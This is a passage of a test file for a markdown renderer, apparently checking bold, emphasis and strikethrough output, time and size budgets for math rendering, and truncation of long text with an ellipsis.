    expect(strongs(timed("A **bold** and *em* and ~~gone~~ word.").html)).toBe(1)
    expect(timed("A **bold** and *em* and ~~gone~~ word.").html).toContain("<del>gone</del>")
  })

  test("math past the text's budget is shown as text", () => {
    const { html, ms } = timed("$x^2$ ".repeat(10_000))
    expect(ms).toBeLessThan(800)
    expect(html).toContain('class="katex"')
    expect(html).toContain("&#36;x^2&#36;")
    // A math fence past the budget is plain code; one within it is math.
    const fence = "```math\n" + "x+".repeat(6_000) + "\n```"
    const parts = prepareMarkdown(`${fence}\n\n${fence}`, "Image")
    expect(
      parts.map((part) =>
        part.kind === "markdown" ? part.text.split("\n").filter((line) => line.startsWith("```")) : [],
      ),
    ).toEqual([["```math", "```", "```text", "```"]])
  })

  test("a text shows its first MAX_MARKDOWN_TEXT characters", () => {
    const parts = prepareMarkdown("word ".repeat(10_000), "Image")
    const text = parts.map((part) => (part.kind === "markdown" ? part.text : "")).join("")
    expect(text.length).toBeLessThanOrEqual(MAX_MARKDOWN_TEXT + 3)
    expect(text.endsWith("…")).toBe(true)
    expect(prepareMarkdown("Short.", "Image")).toEqual([{ kind: "markdown", text: "Short." }])
  })
})
